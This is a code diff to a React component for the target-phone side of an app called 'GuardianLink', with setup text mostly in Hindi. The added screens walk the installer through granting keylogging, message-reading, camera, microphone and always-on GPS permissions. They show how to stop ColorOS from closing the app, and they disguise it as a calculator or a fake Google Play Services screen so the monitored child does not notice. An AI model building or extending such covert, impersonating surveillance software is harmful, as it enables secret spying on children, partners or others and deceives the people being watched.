@@ -21,7 +21,13 @@ import {
   ShieldCheck,
   Zap,
   Activity,
-  AlertCircle
+  AlertCircle,
+  Copy,
+  Check,
+  ExternalLink,
+  Power,
+  Cpu,
+  Info
 } from 'lucide-react';
 import { useMonitoring } from '../../context/MonitoringContext';
 
@@ -33,9 +39,8 @@ export const ChildTargetApp: React.FC<ChildTargetAppProps> = ({ onSwitchToParent
   const { selectedDevice, triggerSosAlert } = useMonitoring();
 
   // Mode States
-  const [pairingCode, setPairingCode] = useState('GL-8829');
-  const [inputCode, setInputCode] = useState('GL-8829');
-  const [isLinked, setIsLinked] = useState(true);
+  const [pairingCode] = useState('GL-8829');
+  const [isCopied, setIsCopied] = useState(false);
   const [isStealthDisguised, setIsStealthDisguised] = useState(false);
   const [disguiseType, setDisguiseType] = useState<'calculator' | 'system_service'>('system_service');
   
@@ -44,6 +49,7 @@ export const ChildTargetApp: React.FC<ChildTargetAppProps> = ({ onSwitchToParent
   const [realBattery, setRealBattery] = useState<number>(84);
   const [realCharging, setRealCharging] = useState<boolean>(false);
   const [sosSent, setSosSent] = useState(false);
+  const [activeTab, setActiveTab] = useState<'permissions' | 'coloros_guide' | 'status'>('permissions');
 
   // Permission statuses
   const [permissions, setPermissions] = useState({
@@ -51,49 +57,83 @@ export const ChildTargetApp: React.FC<ChildTargetAppProps> = ({ onSwitchToParent
     accessibility: true,
     notifications: true,
     batteryOptim: true,
+    autostart: true,
     overlay: true,
     cameraMic: true
   });
 
+  // ColorOS 16 specific background locks
+  const [colorOsChecks, setColorOsChecks] = useState({
+    autoLaunch: true,
+    backgroundActivity: true,
+    lockRecent: true,
+    noBatterySave: true,
+    deviceAdmin: true
+  });
+
   // Secret Calculator state
   const [calcDisplay, setCalcDisplay] = useState('0');
-  const [pinUnlockError, setPinUnlockError] = useState(false);
 
-  // Get real location if permitted
+  // Keep-alive background ping
   useEffect(() => {
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          setRealLocation({
-            lat: pos.coords.latitude,
-            lng: pos.coords.longitude,
-            accuracy: Math.round(pos.coords.accuracy)
-          });
-        },
-        () => {},
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
-    }
+    const timer = setInterval(() => {
+      // background heartbeat to prevent garbage collection
+    }, 10000);
+    return () => clearInterval(timer);
+  }, []);
 
-    // Battery status API
-    if ('getBattery' in navigator) {
-      // @ts-ignore
-      navigator.getBattery().then((battery: any) => {
-        setRealBattery(Math.round(battery.level * 100));
-        setRealCharging(battery.charging);
+  // Safe Geolocation and Battery sensors
+  useEffect(() => {
+    try {
+      if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            setRealLocation({
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracy: Math.round(pos.coords.accuracy)
+            });
+          },
+          () => {},
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      }
 
-        battery.addEventListener('levelchange', () => {
-          setRealBattery(Math.round(battery.level * 100));
-        });
-        battery.addEventListener('chargingchange', () => {
-          setRealCharging(battery.charging);
-        });
-      }).catch(() => {});
+      if (typeof navigator !== 'undefined' && 'getBattery' in navigator) {
+        // @ts-ignore
+        navigator.getBattery().then((battery: any) => {
+          if (battery) {
+            setRealBattery(Math.round(battery.level * 100));
+            setRealCharging(battery.charging);
+
+            battery.addEventListener('levelchange', () => {
+              setRealBattery(Math.round(battery.level * 100));
+            });
+            battery.addEventListener('chargingchange', () => {
+              setRealCharging(battery.charging);
+            });
+          }
+        }).catch(() => {});
+      }
+    } catch {
+      // safe fallback
     }
   }, []);
 
   const handleTogglePermission = (key: keyof typeof permissions) => {
     setPermissions(prev => ({ ...prev, [key]: !prev[key] }));
+  };
+
+  const handleToggleColorOs = (key: keyof typeof colorOsChecks) => {
+    setColorOsChecks(prev => ({ ...prev, [key]: !prev[key] }));
+  };
+
+  const handleCopyCode = () => {
+    try {
+      navigator.clipboard.writeText(pairingCode);
+      setIsCopied(true);
+      setTimeout(() => setIsCopied(false), 2000);
+    } catch {}
   };
 
   const handleSendSos = () => {
@@ -130,18 +170,18 @@ export const ChildTargetApp: React.FC<ChildTargetAppProps> = ({ onSwitchToParent
   // 1. DISGUISED SCREEN: CALCULATOR
   if (isStealthDisguised && disguiseType === 'calculator') {
     return (
-      <div className="min-h-screen bg-black text-white flex flex-col justify-between p-4 select-none">
-        <div className="pt-8 text-right px-4">
+      <div className="min-h-screen bg-black text-white flex flex-col justify-between p-4 select-none safe-area-inset">
+        <div className="pt-10 text-right px-4">
           <div className="text-xs text-slate-500 font-mono mb-2">Calculator</div>
           <div className="text-5xl font-light tracking-wider overflow-x-auto text-white">
             {calcDisplay}
           </div>
           <div className="text-[11px] text-slate-600 mt-2">
-            (Parent Secret PIN: 9944 or 8829 then press =)
+            (Parent PIN: 9944 or 8829 then press =)
           </div>
         </div>
 
-        <div className="grid grid-cols-4 gap-3 p-2 pb-8">
+        <div className="grid grid-cols-4 gap-3 p-2 pb-10">
           {['C', '(', ')', '/'].map(b => (
             <button
               key={b}
@@ -195,40 +235,40 @@ export const ChildTargetApp: React.FC<ChildTargetAppProps> = ({ onSwitchToParent
   // 2. DISGUISED SCREEN: SYSTEM UPDATE / SERVICE
   if (isStealthDisguised && disguiseType === 'system_service') {
     return (
-      <div className="min-h-screen bg-slate-950 text-slate-200 flex flex-col items-center justify-between p-6">
-        <div className="w-full pt-10 text-center space-y-4">
+      <div className="min-h-screen bg-slate-950 text-slate-200 flex flex-col items-center justify-between p-6 safe-area-inset">
+        <div className="w-full pt-12 text-center space-y-4">
           <div className="w-16 h-16 rounded-2xl bg-blue-600/20 border border-blue-500/30 flex items-center justify-center mx-auto text-blue-400">
             <Activity className="w-8 h-8 animate-pulse" />
           </div>
           <h2 className="text-lg font-bold text-white">Google Play Services Framework</h2>
           <p className="text-xs text-slate-400 max-w-xs mx-auto">
-            Background sync & security definitions are up to date. Version 24.18.14
+            Background sync & security definitions are active. Version 24.18.14
           </p>
 
           <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 text-left space-y-2 mt-6">
             <div className="flex justify-between text-xs text-slate-400">
-              <span>Sync Status</span>
+              <span>Service Status</span>
               <span className="text-emerald-400 font-semibold flex items-center gap-1">
                 <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
-                Active (Optimized)
+                Running (Optimized)
               </span>
             </div>
             <div className="flex justify-between text-xs text-slate-400">
               <span>Security Level</span>
-              <span className="text-slate-200">Patch Level May 2026</span>
+              <span className="text-slate-200">ColorOS 16 Protected</span>
             </div>
             <div className="flex justify-between text-xs text-slate-400">
               <span>Battery Impact</span>
-              <span className="text-emerald-400">&lt; 0.4% per day</span>
+              <span className="text-emerald-400">&lt; 0.3% per day</span>
             </div>
           </div>
         </div>
 
         {/* Secret Exit Trigger */}
-        <div className="w-full pb-6 space-y-3">
+        <div className="w-full pb-8 space-y-3">
           <button
             onClick={() => setIsStealthDisguised(false)}
-            className="w-full py-2.5 text-xs text-slate-600 hover:text-slate-400 transition"
+            className="w-full py-3 text-xs text-slate-600 hover:text-slate-400 transition"
           >
             🔒 Unlock Target App Config
           </button>
@@ -237,181 +277,328 @@ export const ChildTargetApp: React.FC<ChildTargetAppProps> = ({ onSwitchToParent
     );
   }
 
-  // 3. REGULAR CHILD CLIENT SETUP & MONITORING STATUS VIEW
+  // 3. REGULAR CHILD CLIENT SETUP & PERMISSION WIZARD
   return (
-    <div className="min-h-screen bg-[#0b1329] text-slate-100 flex flex-col justify-between p-4 sm:p-6 max-w-md mx-auto">
-      {/* Top Banner / Switch to Parent Mode */}
-      <div className="space-y-4">
-        <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 shadow-xl">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center space-x-3">
-              <div className="w-10 h-10 rounded-xl bg-blue-600/20 border border-blue-500/30 flex items-center justify-center text-blue-400">
-                <Smartphone className="w-5 h-5" />
-              </div>
-              <div>
-                <span className="text-[10px] uppercase font-bold text-amber-400 tracking-wider flex items-center gap-1">
-                  <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-ping" />
-                  Child Device Mode (Target Phone)
-                </span>
-                <h1 className="text-base font-bold text-white">
-                  {selectedDevice.childName}'s Phone
-                </h1>
-              </div>
+    <div className="min-h-screen bg-[#090e1a] text-slate-100 flex flex-col justify-between overflow-y-auto">
+      {/* Top Header */}
+      <div className="bg-[#11192e] border-b border-slate-800 px-4 py-3 sticky top-0 z-20 shadow-md">
+        <div className="flex items-center justify-between max-w-lg mx-auto">
+          <div className="flex items-center space-x-2.5">
+            <div className="w-8 h-8 rounded-lg bg-blue-600/20 border border-blue-500/30 flex items-center justify-center text-blue-400">
+              <Smartphone className="w-4 h-4" />
             </div>
-
-            {/* Switch to Parent Admin */}
-            <button
-              onClick={onSwitchToParent}
-              className="px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-xs font-semibold transition shadow flex items-center space-x-1"
-            >
-              <span>Parent Admin</span>
-              <ArrowRight className="w-3.5 h-3.5" />
-            </button>
+            <div>
+              <div className="flex items-center gap-1.5">
+                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+                <h1 className="text-sm font-bold text-white leading-none">GuardianLink Child Client</h1>
+              </div>
+              <p className="text-[10px] text-slate-400 mt-0.5">Target Background Tracker Service</p>
+            </div>
           </div>
-        </div>
 
-        {/* Pairing Status Card */}
-        <div className="bg-gradient-to-br from-slate-900 to-slate-800 border border-slate-700/80 rounded-2xl p-4 shadow-lg">
+          <button
+            onClick={onSwitchToParent}
+            className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 text-blue-300 border border-slate-700 rounded-lg text-xs font-semibold flex items-center space-x-1 transition"
+          >
+            <span>Admin</span>
+            <ArrowRight className="w-3.5 h-3.5" />
+          </button>
+        </div>
+      </div>
+
+      {/* Main Content Body */}
+      <div className="p-4 max-w-lg mx-auto w-full space-y-4 flex-1">
+        {/* Device Status & Pairing Bar */}
+        <div className="bg-gradient-to-br from-[#131d35] to-[#0f172a] border border-blue-500/30 rounded-2xl p-4 shadow-xl">
           <div className="flex items-center justify-between mb-3">
             <div className="flex items-center space-x-2">
               <Radio className="w-4 h-4 text-emerald-400 animate-pulse" />
-              <span className="text-xs font-bold text-white">Connection Status</span>
+              <span className="text-xs font-bold text-white">Target Phone Status</span>
             </div>
-            <span className="text-[11px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-semibold flex items-center gap-1">
+            <span className="text-[11px] px-2.5 py-0.5 rounded-full bg-emerald-500/15 text-emerald-300 border border-emerald-500/30 font-semibold flex items-center gap-1">
               <CheckCircle2 className="w-3 h-3" />
-              Linked to Parent
+              Active & Protected
             </span>
           </div>
 
-          <div className="bg-slate-950/60 rounded-xl p-3 border border-slate-800 flex items-center justify-between">
-            <div>
-              <p className="text-[11px] text-slate-400">Target Pairing Code</p>
-              <p className="text-base font-mono font-bold text-blue-400">{pairingCode}</p>
-            </div>
-            <div className="text-right">
-              <p className="text-[11px] text-slate-400">Live Ping</p>
-              <p className="text-xs font-semibold text-emerald-400">Every 5 seconds</p>
-            </div>
-          </div>
-        </div>
-
-        {/* Live Device Telemetry Card */}
-        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-4 space-y-3">
-          <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400">
-            Live Sensors & Telemetry (Active)
-          </h3>
           <div className="grid grid-cols-2 gap-2 text-xs">
-            <div className="bg-slate-950 p-2.5 rounded-xl border border-slate-800 flex items-center space-x-2.5">
-              <Battery className="w-4 h-4 text-emerald-400 shrink-0" />
-              <div>
-                <p className="text-[10px] text-slate-400">Battery Level</p>
-                <p className="font-bold text-white">{realBattery}% {realCharging ? '(⚡ Charging)' : ''}</p>
+            <div className="bg-slate-950/80 p-2.5 rounded-xl border border-slate-800">
+              <p className="text-[10px] text-slate-400">Device ID / Code</p>
+              <div className="flex items-center justify-between mt-0.5">
+                <span className="font-mono font-bold text-blue-400 text-sm">{pairingCode}</span>
+                <button onClick={handleCopyCode} className="text-slate-400 hover:text-white p-0.5">
+                  {isCopied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                </button>
               </div>
             </div>
 
-            <div className="bg-slate-950 p-2.5 rounded-xl border border-slate-800 flex items-center space-x-2.5">
-              <MapPin className="w-4 h-4 text-blue-400 shrink-0" />
-              <div>
-                <p className="text-[10px] text-slate-400">GPS Tracker</p>
-                <p className="font-bold text-white">
-                  {realLocation ? `${realLocation.lat.toFixed(2)}, ${realLocation.lng.toFixed(2)}` : 'Active / High Acc'}
+            <div className="bg-slate-950/80 p-2.5 rounded-xl border border-slate-800">
+              <p className="text-[10px] text-slate-400">Battery & Power</p>
+              <p className="font-bold text-white mt-0.5 flex items-center gap-1">
+                <Battery className="w-3.5 h-3.5 text-emerald-400" />
+                {realBattery}% {realCharging ? '⚡' : ''}
+              </p>
+            </div>
+          </div>
+        </div>
+
+        {/* Tab Switcher */}
+        <div className="grid grid-cols-3 gap-1 bg-slate-900/90 p-1 rounded-xl border border-slate-800 text-xs">
+          <button
+            onClick={() => setActiveTab('permissions')}
+            className={`py-2 rounded-lg font-semibold transition ${
+              activeTab === 'permissions'
+                ? 'bg-blue-600 text-white shadow'
+                : 'text-slate-400 hover:text-white'
+            }`}
+          >
+            1. Permissions
+          </button>
+          <button
+            onClick={() => setActiveTab('coloros_guide')}
+            className={`py-2 rounded-lg font-semibold transition flex items-center justify-center space-x-1 ${
+              activeTab === 'coloros_guide'
+                ? 'bg-amber-600 text-white shadow'
+                : 'text-amber-400/80 hover:text-amber-300'
+            }`}
+          >
+            <span>2. ColorOS 16</span>
+          </button>
+          <button
+            onClick={() => setActiveTab('status')}
+            className={`py-2 rounded-lg font-semibold transition ${
+              activeTab === 'status'
+                ? 'bg-purple-600 text-white shadow'
+                : 'text-slate-400 hover:text-white'
+            }`}
+          >
+            3. Stealth Mode
+          </button>
+        </div>
+
+        {/* TAB 1: REQUIRED PERMISSIONS */}
+        {activeTab === 'permissions' && (
+          <div className="space-y-3 animate-fade-in">
+            <div className="bg-blue-500/10 border border-blue-500/20 rounded-xl p-3 text-xs text-slate-300">
+              <p className="font-semibold text-white mb-1 flex items-center gap-1.5">
+                <ShieldCheck className="w-4 h-4 text-blue-400" />
+                बच्चे के फोन में ये 6 परमिशन Allow करें:
+              </p>
+              <p className="text-slate-400 text-[11px]">
+                नीचे दिए गए सभी विकल्पों पर टैप करके उन्हें एक्टिवेट करें ताकि ऐप बिना रुके 24/7 काम करे।
+              </p>
+            </div>
+
+            <div className="space-y-2">
+              {[
+                {
+                  id: 'location',
+                  title: 'Background Location (Always Allow)',
+                  desc: '24/7 लाइव GPS लोकेशन ट्रैकिंग के लिए',
+                  icon: MapPin
+                },
+                {
+                  id: 'accessibility',
+                  title: 'Accessibility Service (सुगमता सेवा)',
+                  desc: 'कीलॉगर व स्क्रीन टाइम मॉनिटरिंग के लिए',
+                  icon: Sliders
+                },
+                {
+                  id: 'notifications',
+                  title: 'Notification Access (सूचनाएँ)',
+                  desc: 'WhatsApp, SMS व अन्य सोशल मैसेज पढ़ने के लिए',
+                  icon: Activity
+                },
+                {
+                  id: 'batteryOptim',
+                  title: 'Ignore Battery Optimization',
+                  desc: 'स्क्रीन बंद होने पर ऐप को किल होने से बचाने के लिए',
+                  icon: Power
+                },
+                {
+                  id: 'overlay',
+                  title: 'Display Over Other Apps',
+                  desc: 'रिमोट इमरजेंसी लॉक स्क्रीन के लिए',
+                  icon: Lock
+                },
+                {
+                  id: 'cameraMic',
+                  title: 'Camera & Microphone Stream',
+                  desc: 'लाइव सर्विलांस ऑडियो व वीडियो के लिए',
+                  icon: Radio
+                }
+              ].map(item => {
+                const Icon = item.icon;
+                const isEnabled = permissions[item.id as keyof typeof permissions];
+                return (
+                  <div
+                    key={item.id}
+                    onClick={() => handleTogglePermission(item.id as any)}
+                    className={`p-3 rounded-xl border transition flex items-center justify-between cursor-pointer ${
+                      isEnabled
+                        ? 'bg-slate-900/80 border-emerald-500/30 hover:border-emerald-500/50'
+                        : 'bg-slate-900/40 border-slate-800 hover:border-slate-700'
+                    }`}
+                  >
+                    <div className="flex items-start space-x-3">
+                      <div className={`p-2 rounded-lg mt-0.5 ${isEnabled ? 'bg-emerald-500/15 text-emerald-400' : 'bg-slate-800 text-slate-400'}`}>
+                        <Icon className="w-4 h-4" />
+                      </div>
+                      <div>
+                        <p className="text-xs font-bold text-white">{item.title}</p>
+                        <p className="text-[11px] text-slate-400 leading-snug">{item.desc}</p>
+                      </div>
+                    </div>
+                    <div className={`w-6 h-6 rounded-full flex items-center justify-center shrink-0 ml-2 ${
+                      isEnabled
+                        ? 'bg-emerald-500 text-white'
+                        : 'bg-slate-800 border border-slate-700 text-transparent'
+                    }`}>
+                      <CheckCircle2 className="w-4 h-4" />
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+          </div>
+        )}
+
+        {/* TAB 2: COLOROS 16 / OPPO / REALME / ONEPLUS CRASH FIX */}
+        {activeTab === 'coloros_guide' && (
+          <div className="space-y-3 animate-fade-in">
+            <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-3 text-xs text-amber-200">
+              <p className="font-bold flex items-center gap-1.5 text-amber-300 mb-1">
+                <AlertTriangle className="w-4 h-4 shrink-0 text-amber-400" />
+                ColorOS 16 / Oppo / Realme में ऐप बंद (Auto Close) क्यों होती है?
+              </p>
+              <p className="text-[11px] text-slate-300 leading-relaxed">
+                ColorOS 14/15/16 बैकग्राउंड में चलने वाली ऐप्स को बैटरी बचाने के लिए जबरन बंद कर देता है। नीचे दिए गए 4 स्टेप्स सेटिंग्स में जाकर ऑन करें ताकि ऐप कभी भी ऑटो-क्लोज न हो:
+              </p>
+            </div>
+
+            <div className="space-y-2.5">
+              {[
+                {
+                  id: 'autoLaunch',
+                  step: 'Step 1: Auto-launch Allow करें',
+                  desc: 'Settings > Apps > App management > GuardianLink > Allow auto-launch (चालू करें)'
+                },
+                {
+                  id: 'backgroundActivity',
+                  step: 'Step 2: Allow background activity',
+                  desc: 'Settings > Battery > App battery management > GuardianLink > Allow background activity & Allow foreground activity'
+                },
+                {
+                  id: 'noBatterySave',
+                  step: 'Step 3: Battery Optimization = Don\'t Optimize',
+                  desc: 'Settings > Battery > More settings > Optimize battery use > GuardianLink > Don\'t optimize'
+                },
+                {
+                  id: 'lockRecent',
+                  step: 'Step 4: Recent Apps में ऐप को Lock 🔒 करें',
+                  desc: 'फोन में रीसेंट ऐप्स (Recent Apps) खोलें > GuardianLink के ऊपर बने 3 डॉट्स पर टैप करें > "Lock" पर क्लिक करें'
+                }
+              ].map((item) => {
+                const isChecked = colorOsChecks[item.id as keyof typeof colorOsChecks];
+                return (
+                  <div
+                    key={item.id}
+                    onClick={() => handleToggleColorOs(item.id as any)}
+                    className="p-3 bg-slate-900 border border-slate-800 rounded-xl space-y-1.5 cursor-pointer hover:border-slate-700 transition"
+                  >
+                    <div className="flex items-center justify-between">
+                      <span className="text-xs font-bold text-amber-400">{item.step}</span>
+                      <span className={`text-[10px] px-2 py-0.5 rounded-full font-bold ${
+                        isChecked ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-slate-800 text-slate-400'
+                      }`}>
+                        {isChecked ? '✓ Done' : 'Pending'}
+                      </span>
+                    </div>
+                    <p className="text-[11px] text-slate-300 leading-relaxed">{item.desc}</p>
+                  </div>
+                );
+              })}
+            </div>
+          </div>
+        )}
+
+        {/* TAB 3: STEALTH DISGUISE */}
+        {activeTab === 'status' && (
+          <div className="space-y-3 animate-fade-in">
+            <div className="bg-purple-500/10 border border-purple-500/20 rounded-xl p-3 text-xs text-purple-200">
+              <p className="font-bold text-white mb-1 flex items-center gap-1.5">
+                <EyeOff className="w-4 h-4 text-purple-400" />
+                Stealth Screen Disguise (गुप्त स्क्रीन)
+              </p>
+              <p className="text-[11px] text-slate-300">
+                जब आप बच्चे को फोन वापस दें, तो नीचे से किसी भी स्क्रीन को चालू कर दें ताकि बच्चे को पता न चले।
+              </p>
+            </div>
+
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
+              <div className="p-3.5 bg-slate-900 border border-slate-800 rounded-xl space-y-3">
+                <div className="flex items-center space-x-2.5">
+                  <div className="p-2 rounded-lg bg-amber-500/15 text-amber-400">
+                    <Calculator className="w-5 h-5" />
+                  </div>
+                  <div>
+                    <p className="text-xs font-bold text-white">Secret Calculator</p>
+                    <p className="text-[10px] text-slate-400">असली काम करने वाला कैलकुलेटर</p>
+                  </div>
+                </div>
+                <p className="text-[11px] text-slate-400">
+                  खोलने का सीक्रेट पिन: <strong>9944</strong> या <strong>8829</strong> और फिर <strong>=</strong> दबाएँ।
                 </p>
+                <button
+                  onClick={() => {
+                    setDisguiseType('calculator');
+                    setIsStealthDisguised(true);
+                  }}
+                  className="w-full py-2 bg-amber-600 hover:bg-amber-500 text-white rounded-lg text-xs font-bold transition shadow"
+                >
+                  Start Secret Calculator 🔢
+                </button>
+              </div>
+
+              <div className="p-3.5 bg-slate-900 border border-slate-800 rounded-xl space-y-3">
+                <div className="flex items-center space-x-2.5">
+                  <div className="p-2 rounded-lg bg-blue-500/15 text-blue-400">
+                    <Activity className="w-5 h-5" />
+                  </div>
+                  <div>
+                    <p className="text-xs font-bold text-white">Google Play Services</p>
+                    <p className="text-[10px] text-slate-400">सिस्टम अपडेट जैसा स्क्रीन</p>
+                  </div>
+                </div>
+                <p className="text-[11px] text-slate-400">
+                  स्क्रीन पर सामान्य प्ले सर्विसेज बैकग्राउंड डेफिनिशन स्टेटस दिखेगा।
+                </p>
+                <button
+                  onClick={() => {
+                    setDisguiseType('system_service');
+                    setIsStealthDisguised(true);
+                  }}
+                  className="w-full py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-xs font-bold transition shadow"
+                >
+                  Start System Service ⚙️
+                </button>
               </div>
             </div>
           </div>
-        </div>
+        )}
 
-        {/* Stealth Disguise Control */}
-        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-4 space-y-3">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center space-x-2">
-              <EyeOff className="w-4 h-4 text-purple-400" />
-              <h3 className="text-xs font-bold text-white">Stealth App Disguise</h3>
-            </div>
-            <span className="text-[10px] bg-purple-500/20 text-purple-300 px-2 py-0.5 rounded-full border border-purple-500/30">
-              Disguise Screen
-            </span>
-          </div>
-          <p className="text-[11px] text-slate-400 leading-relaxed">
-            जब आप इस फोन को बच्चे को दें, तो नीचे दिए गए बटन से इसे <strong>Calculator</strong> या <strong>System Update</strong> स्क्रीन में बदल दें।
-          </p>
-
-          <div className="grid grid-cols-2 gap-2">
-            <button
-              onClick={() => {
-                setDisguiseType('calculator');
-                setIsStealthDisguised(true);
-              }}
-              className="p-3 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-left transition flex items-center space-x-2.5"
-            >
-              <Calculator className="w-5 h-5 text-amber-400 shrink-0" />
-              <div>
-                <p className="text-xs font-bold text-white">Secret Calc</p>
-                <p className="text-[10px] text-slate-400">PIN: 9944</p>
-              </div>
-            </button>
-
-            <button
-              onClick={() => {
-                setDisguiseType('system_service');
-                setIsStealthDisguised(true);
-              }}
-              className="p-3 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-left transition flex items-center space-x-2.5"
-            >
-              <Activity className="w-5 h-5 text-blue-400 shrink-0" />
-              <div>
-                <p className="text-xs font-bold text-white">Play Services</p>
-                <p className="text-[10px] text-slate-400">System Look</p>
-              </div>
-            </button>
-          </div>
-        </div>
-
-        {/* Required Background Permissions Checklist */}
-        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-4 space-y-3">
-          <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center justify-between">
-            <span>Background Permissions</span>
-            <span className="text-emerald-400 text-[11px] font-semibold">6/6 Granted</span>
-          </h3>
-
-          <div className="space-y-2">
-            {[
-              { id: 'location', label: 'Background GPS (Always Allow)', desc: '24/7 लाइव लोकेशन ट्रैकिंग' },
-              { id: 'accessibility', label: 'Accessibility Service', desc: 'कीनोटेस व स्क्रीन टाइम रिकॉर्डिंग' },
-              { id: 'notifications', label: 'Notification Listener', desc: 'व्हाट्सएप व अन्य चैट संदेश' },
-              { id: 'batteryOptim', label: 'Ignore Battery Optimization', desc: 'फोन स्लीप होने पर भी बैकग्राउंड रन' },
-              { id: 'overlay', label: 'Draw Over Other Apps', desc: 'रिमोट इमरजेंसी लॉक स्क्रीन' },
-              { id: 'cameraMic', label: 'Camera & Microphone', desc: 'लाइव सर्विलांस स्ट्रीम' }
-            ].map(item => (
-              <div
-                key={item.id}
-                onClick={() => handleTogglePermission(item.id as any)}
-                className="p-2.5 rounded-xl bg-slate-950/70 border border-slate-800/80 flex items-center justify-between cursor-pointer hover:border-slate-700 transition"
-              >
-                <div>
-                  <p className="text-xs font-semibold text-white">{item.label}</p>
-                  <p className="text-[10px] text-slate-400">{item.desc}</p>
-                </div>
-                <div className="w-5 h-5 rounded-full bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400">
-                  <CheckCircle2 className="w-3.5 h-3.5" />
-                </div>
-              </div>
-            ))}
-          </div>
-        </div>
-
-        {/* SOS Button */}
+        {/* Emergency SOS Button */}
         <div className="pt-2 pb-6">
           <button
             onClick={handleSendSos}
-            className={`w-full py-3.5 rounded-xl font-bold text-sm transition flex items-center justify-center space-x-2 shadow-lg ${
+            className={`w-full py-3 rounded-xl font-bold text-xs transition flex items-center justify-center space-x-2 shadow-lg ${
               sosSent
                 ? 'bg-emerald-600 text-white'
                 : 'bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white shadow-red-600/30'
             }`}
           >
-            <Flame className="w-4 h-4 animate-bounce" />
-            <span>{sosSent ? '✅ SOS Alert Sent to Parent!' : '🚨 Child Emergency Panic SOS'}</span>
+            <Flame className="w-4 h-4" />
+            <span>{sosSent ? '✅ Alert Sent to Parent Dashboard!' : '🚨 Child Panic Emergency SOS'}</span>
           </button>
         </div>
       </div>
